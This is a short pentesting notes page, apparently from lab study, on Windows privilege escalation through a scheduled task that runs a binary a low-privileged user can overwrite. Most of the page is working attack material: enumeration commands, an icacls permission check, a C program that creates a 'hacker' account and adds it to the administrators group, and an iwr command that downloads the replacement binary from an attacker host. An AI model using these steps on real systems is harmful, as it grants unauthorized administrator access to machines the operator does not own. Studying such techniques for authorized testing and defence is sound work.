# Scheduled Tasks

---

Once the command is executed, we get a huge amount of output with information about all scheduled tasks on the system. We should seek interesting information in the Author, TaskName, Task To Run, Run As User, and Next Run Time fields.

## Syntax

Enumerating Tasks in PowerShell

```
Get-ScheduledTask
```

In Windows CLI

```
schtasks /query /fo LIST /v | findstr /B /C:"Folder" /C:"TaskName" /C:"Run As User" /C:"Schedule" /C:"Scheduled Task State" /C:"Schedule Type" /C:"Repeat: Every" /C:"Comment"
...
Folder: \Microsoft
HostName:                             CLIENTWK220
TaskName:                             \Microsoft\CacheCleanup
Next Run Time:                        7/11/2022 2:47:21 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/11/2022 2:46:22 AM
Last Result:                          0
Author:                               CLIENTWK220\daveadmin
Task To Run:                          C:\Users\steve\Pictures\BackendCacheCleanup.exe
Start In:                             C:\Users\steve\Pictures
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          daveadmin
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           7:37:21 AM
Start Date:                           7/4/2022
...
```

Checking if we write access for the path. 

```
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                BUILTIN\Administrators:(I)(F)
                                                CLIENTWK220\steve:(I)(F)
                                                CLIENTWK220\offsec:(I)(F)
```

Since we have write access we can simply replace the .exe with an malicious one to create a new user.

```
cat malicious.c     
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user hacker password123! /add");
  i = system ("net localgroup administrators hacker /add");
  
  return 0;
}
```

Compile the binary.

```
gcc malicious.c -o BackendCacheCleanup.exe
```

Download the binary onto the target machine.

```
iwr -uri http://192.168.45.193/shell.exe -OutFile BackendCacheCleanup.exe
```
